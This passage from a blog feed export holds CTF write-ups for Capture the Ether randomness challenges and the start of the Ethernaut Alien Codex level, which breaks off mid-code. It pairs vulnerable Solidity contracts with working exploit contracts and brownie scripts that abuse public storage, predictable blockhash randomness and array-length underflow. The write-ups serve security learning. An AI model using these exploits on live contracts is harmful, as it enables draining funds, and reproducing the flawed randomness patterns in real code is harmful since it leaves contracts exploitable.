class="keyword">import</span> GuessTheSecretNumberChallenge, accounts, web3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = GuessTheSecretNumberChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> web3.eth.get_storage_at(contract.address, <span class="number">0</span>) == web3.soliditySha3(abi_types=[<span class="string">&#x27;uint8&#x27;</span>], values=[i]):</span><br><span class="line">            contract.guess(i, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[ ] got the Guess: <span class="subst">&#123;i&#125;</span> !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheRandomNumberChallenge</span> &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheRandomNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        answer = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to guess the random number generated by the contract. one thing to remember is ethereum virtual machine is a deterministic machine and it canâ€™t generate sudo random numbers inside the contract, if it does generate a random number then the miner gets the advantage of executing the transaction muptiple times until he gets a random number of his desire and then include the transaction in the blockchain, this is an unfair advantage for the miner and contradict the basic concept of desentralisation. however here the contract is using the blockhash of the previous block and the time to get the random number and stores it in the contract since all the storage in a smart contract is public we can read the number and pass it <code>guess()</code> function to solve this challenge.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> GuessTheRandomNumberChallenge, accounts, web3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = GuessTheRandomNumberChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.guess(web3.eth.get_storage_at(contract.address, <span class="number">0</span>),</span><br><span class="line">                   &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheNewNumberChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheNewNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        uint8 answer = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This contract calculates the random number in the same way as in the previous challenge, but this time this contract is not storing the number, however the blockhash and timestamp are public we can calculate the random number and call the contract at the same time so that the guess and the answer matches.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.3</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GuessTheNewNumberChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Gtnn</span>_Exploit &#123;</span><br><span class="line">    <span class="title class_">GuessTheNewNumberChallenge</span> gtnn;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        gtnn = <span class="title class_">GuessTheNewNumberChallenge</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        uint8 ans = <span class="title function_">uint8</span>(</span><br><span class="line">            <span class="title function_">uint256</span>(</span><br><span class="line">                <span class="title function_">keccak256</span>(</span><br><span class="line">                    abi.<span class="title function_">encodePacked</span>(</span><br><span class="line">                        <span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>),</span><br><span class="line">                        block.<span class="property">timestamp</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        gtnn.<span class="property">guess</span>&#123;<span class="attr">value</span>: <span class="number">1</span> ether&#125;(ans);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> GuessTheNewNumberChallenge, Gtnn_Exploit, accounts, web3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = GuessTheNewNumberChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">    exploit = Gtnn_Exploit.deploy(</span><br><span class="line">        contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    tx = exploit.exploit(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    <span class="built_in">print</span>(tx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PredictTheFutureChallenge</span> &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">PredictTheFutureChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">lockInGuess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(guesser == <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.<span class="property">sender</span>;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.<span class="property">number</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">settle</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == guesser);</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span> &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = <span class="title function_">uint8</span>(</span><br><span class="line">            <span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now)</span><br><span class="line">        ) % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        guesser = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (guess == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this challenge we need to lock a guess using <code>lockInGuess()</code> function, and use the <code>settle()</code> function to evaluvate the guess, this time the range is narrowed down to only <strong>10</strong> numbers, so I just passed <code>0x05</code> to the <code>lockInGuess()</code> function and waited for the block which gives 5 when the random number is calculated inside the contract and then called <code>settle()</code> function to complete the challenge.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">PredictTheFutureChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">lockInGuess</span>(<span class="params">uint8 n</span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">settle</span>(<span class="params"></span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Ptf</span>_Exploit &#123;</span><br><span class="line">    <span class="title class_">PredictTheFutureChallenge</span> ptf;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        ptf = <span class="title class_">PredictTheFutureChallenge</span>(_address);</span><br><span class="line">        ptf.<span class="property">lockInGuess</span>.<span class="title function_">value</span>(<span class="number">1</span> ether)(<span class="number">0x05</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        uint8 ans = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now)) %</span><br><span class="line">            <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span> (ans == <span class="title function_">uint8</span>(<span class="number">0x05</span>)) &#123;</span><br><span class="line">            ptf.<span class="title function_">settle</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> PredictTheFutureChallenge, Ptf_Exploit, accounts, chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = PredictTheFutureChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">    exploit = Ptf_Exploit.deploy(</span><br><span class="line">        contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> contract.isComplete():</span><br><span class="line">        exploit.exploit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PredictTheBlockHashChallenge</span> &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">PredictTheBlockHashChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">lockInGuess</span>(<span class="params">bytes32 hash</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(guesser == <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.<span class="property">sender</span>;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.<span class="property">number</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">settle</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == guesser);</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span> &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.<span class="title function_">blockhash</span>(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (guess == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This challenge is very similar to the previous challenge, but this challenge uses only <code>block.blockhash()</code> function to generate the random number. since <code>block.blockhash()</code> gives only blockhashes of last <code>256</code> blocks if we wait for <code>256</code> blocks the function returns <code>0</code> which results the answer to be <code>0</code> so we can pass <code>0</code> to the <code>lockInGuess()</code> function and wait for 256 blocks to complete and then call the <code>settle()</code> function to solve this challenge.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> PredictTheBlockHashChallenge, accounts, chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = PredictTheBlockHashChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.lockInGuess(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">32</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">    chain.mine(<span class="number">257</span>)</span><br><span class="line">    contract.settle(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SmartContract </tag>
            
            <tag> ethereum </tag>
            
            <tag> solidity </tag>
            
            <tag> writeup </tag>
            
            <tag> CaptureTheEther </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>19-27 Ethernaut CTF</title>
      <link href="/2022/11/17/19-27-Ethernaut-CTF/"/>
      <url>/2022/11/17/19-27-Ethernaut-CTF/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 - Alien Codex"></a>19 - Alien Codex</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;../helpers/Ownable-05.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AlienCodex</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">contacted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">assert</span>(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">make_contact</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">bytes32 _content</span>) contacted public &#123;</span><br><span class="line">    codex.<span class="title function_">push</span>(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>) contacted public &#123;</span><br><span class="line">    codex.<span class="property">length</span>--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint i, bytes32 _content</span>) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Goal is to claim the ownership of this contract, if we look into the challenge it inherits <code>Ownable</code> hance the <code>first slot</code> contains <code>owner&#39;s address</code>, <code>2nd slot: contact (bool)</code> and <code>3rd slot: length of codex array (bytes32[])</code>. comming to the functions thereâ€™s <code>make_contact()</code> function to make the <code>contact</code> variable <code>True</code> and <code>record</code> function to push an item into the array and <code>revise</code> to edit an item inside the array and these functions require <code>contact</code> to be <code>True</code>, but <code>retract()</code> function is suspicious since it is decrementing the length of the array and we can say that this functionâ€™s functionality is not related to the context of this smart contract. however since this contract is not using <code>Safemath</code> multiple times of calling <code>retract()</code> function can lead to an <code>underflow</code> of the length variable and we can make the <strong>length of to <code>2^256</code></strong>. hance we can edit each and every slot of this smart contractâ€™s memory. so we can become the <code>owner</code> by editing the 1st slot replacing it with our address.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma 